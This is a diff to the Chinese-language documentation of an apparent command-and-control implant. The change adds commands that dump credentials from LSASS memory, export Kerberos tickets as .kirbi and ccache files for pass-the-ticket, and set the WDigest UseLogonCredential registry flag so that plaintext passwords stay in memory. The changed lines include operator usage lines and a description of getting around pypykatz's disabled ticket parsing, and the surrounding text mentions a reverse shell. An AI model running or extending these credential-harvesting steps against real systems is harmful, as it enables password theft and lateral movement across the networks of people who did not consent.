@@ -74,7 +74,9 @@ python3 b.py
 | `creds [env|windows|linux|all]` | 枚举操作系统向**当前用户**暴露的凭据（见下“门控凭据接口”）。 |
 | `lsass <out.dmp> [comsvcs\|ctypes]` | 把 LSASS 进程内存 dump 成 minidump（仅 Windows，需管理员）。见下“LSASS 进程内存转储”章节。 |
 | `lsass-parse <dump_path>` | 用 pypykatz 解析 LSASS minidump（操作端）。 |
-| `sekurlsa [--pkgs ...] [--pid ...] [--no-lsa]` | 从 LSASS 内存**在线**解析 SSP 凭据（mimikatz `sekurlsa::logonpasswords` 等价，仅 Windows，需管理员）。见下章节。 |
+| `sekurlsa [--pkgs ...] [--pid ...] [--no-lsa] [--export-dir D] [--export-ccache F]` | 从 LSASS 内存**在线**解析 SSP 凭据（mimikatz `sekurlsa::logonpasswords` 等价，仅 Windows，需管理员），可选 Kerberos 票证导出。见下章节。 |
+| `wdigest-enable [--disable]` | 设 WDigest `UseLogonCredential=1`（或 0），让之后的登录在 LSASS 里留明文（仅 Windows，需管理员）。 |
+| `wdigest-status` | 查看当前 WDigest `UseLogonCredential` 设置（仅 Windows）。 |
 
 ## 反弹 Shell（bash 回调 → 交互式 Shell）
 
@@ -206,7 +208,30 @@ beacon[<sid>]> sekurlsa --pkgs msv,wdigest,kerberos        # 只跑子集
 beacon[<sid>]> sekurlsa --pid 1234                          # 指定 PID
 beacon[<sid>]> sekurlsa --no-lsa                            # 跳过 LSA 步骤
                                                           # （更快，但拿不到明文）
+beacon[<sid>]> sekurlsa --export-dir C:\Windows\Temp\tk     # 票证导出为 .kirbi
+beacon[<sid>]> sekurlsa --export-ccache C:\Windows\Temp\t.cc  # 单个 MIT ccache
 ```
+
+**Kerberos 票证导出（pass-the-ticket）**：`--export-dir` 把每张恢复的 TGT/TGS
+写成 `.kirbi` 文件；`--export-ccache` 把它们全部写进一个 MIT ccache。两者都会
+强制开启 `kerberos` SSP，且需要 LSA 会话密钥，所以在 `--no-lsa` 模式下被忽略。
+上游 pypykatz 在 `get_kerberos()` 里强制关闭了票证解析（标注"不工作"）；本模块
+直接驱动 `KerberosDecryptor` 并传 `with_tickets=True` 来恢复 kirbi 数据。导出的
+`.kirbi` 可喂给 Rubeus / mimikatz `kerberos::ptt`，ccache 可配合 impacket 的
+`secretsdump`/`psexec` 等使用。
+
+**WDigest 明文开关** —— sekurlsa 要从 WDigest 恢复明文密码前，目标机必须先开
+`UseLogonCredential=1`：
+
+```bash
+beacon[<sid>]> wdigest-status         # 明文存储开了吗？
+beacon[<sid>]> wdigest-enable         # 设 UseLogonCredential=1
+beacon[<sid>]> wdigest-enable --disable   # 设回 0
+```
+
+该标志只对**新的**登录生效——开启后需等待用户/服务重新认证，再跑 `sekurlsa`
+收割明文。设置需要管理员（HKLM 写权限）。操作端等价命令：`cscli wdigest-enable
+[--disable]` 与 `cscli wdigest-status`。
 
 输出示例：
 
